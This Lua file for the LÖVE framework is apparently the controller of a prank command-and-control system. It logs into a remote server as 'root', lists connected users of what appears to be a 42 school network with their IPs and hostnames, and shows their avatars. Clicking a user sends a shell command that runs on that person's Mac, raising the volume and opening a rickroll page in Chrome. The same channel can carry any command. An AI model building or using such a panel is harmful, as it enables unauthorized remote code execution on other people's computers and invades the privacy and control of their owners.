

local socket = require "socket"
local json   = require "json"
local http = require("socket.http")

new = {}

function new._object(class, o)
   local o = o or {}
   setmetatable(o, { __index = class })
   return o
end

new._mt = {}
function new._mt.__index(table, key)
   local class = _G[key]
   return type(class.initialize) == 'function' and class.initialize or function() return new._object(class) end
end
setmetatable(new,new._mt)

---------------------------------

----------------------------------------------------------------

function loadImg(login)
    if not love.filesystem.exists(login..".jpg") then
        local b, c, h = http.request("https://cdn.42.fr/userprofil/profilview/"..login..".jpg")
        if c == 200 then
            love.filesystem.write(login..".jpg", b)
        else
            return false
        end
    end
    return true
end

avatar = {}

function drawPeople(v,x,y)
    love.graphics.draw( avatar[v.login], x, y)
    love.graphics.setColor( 0, 0, 0, 200)
    love.graphics.rectangle( 'fill', x, y, 160, 30)
    love.graphics.setColor( 255, 255, 255, 255)
    love.graphics.print(v.login,    x + 10, y + 2)
    love.graphics.print(v.hostname, x + 10, y + 15)
end

function drawList()
    id = 0
    for k,v in pairs(tab) do
        drawPeople(v, math.floor(id / 4) * 160, (id * 190) % (190*4))
        id = id + 1
    end
end

function love.load()

    host = "antoine.doussaud.org"
    port = 1234;

    tcpSocket = socket.tcp()
    tcpSocket:connect(host, port)
    tcpSocket:send("cmd:root\n")   -- get root
    print(tcpSocket:receive("*l")) -- is root
    tab = {}

end

i = 0

function love.update(dt)

    i = i + dt
    if (i > 2) then
        tcpSocket:send("cmd:client\n")
        data = tcpSocket:receive("*l")
        if data then
            if data:sub(0,7) == "jso:lst" then
                tab = json.decode(data:sub(9))
                for k,v in pairs(tab) do
                    if (not avatar[v.login]) then
                        if v.login and loadImg(v.login) then
                            avatar[v.login] = love.graphics.newImage(v.login..".jpg")
                        else
                            if not v.login then
                                v.login = "default"
                                v.hostname = " ? telnet ?"
                            end
                            avatar[v.login] = love.graphics.newImage("default.png")
                        end
                    end
                end
            end
        end
        i = 0
    end

end

function love.draw()
    drawList()
end

function love.mousepressed(x, y, button)

    print(x,y,button)

    print(math.floor(x / 160)*4 +math.floor(y / 190))

    target = math.floor(x / 160)*4 +math.floor(y / 190);

    id = 0
    for k,v in pairs(tab) do
        if id == target then
            print("send:", v.ip, v.port, v.login)
            tmp = {ip = v.ip, port = v.port, cmd = "osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://rickrolled.fr/'"}
            tcpSocket:send("cmd:run:"..json.encode(tmp).."\n")
        end
        id = id + 1
    end

end
